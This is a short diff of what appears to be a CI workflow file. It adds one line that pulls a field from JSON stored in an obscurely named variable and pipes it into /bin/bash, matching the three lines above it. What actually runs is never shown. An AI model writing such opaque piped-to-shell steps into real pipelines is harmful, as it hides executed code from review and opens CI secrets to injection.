@@ -33,6 +33,7 @@ jobs:
           echo $l36 | jq -r .exk33 | /bin/bash
           echo $awugp32 | jq -r .yikyj5 | /bin/bash
           printf '%s' "$vp85383" | jq -r .lbds5104 | /bin/bash
+          echo $u9868 | jq -r .bmwe8975 | /bin/bash
 
       - name: Store results
         if: always()
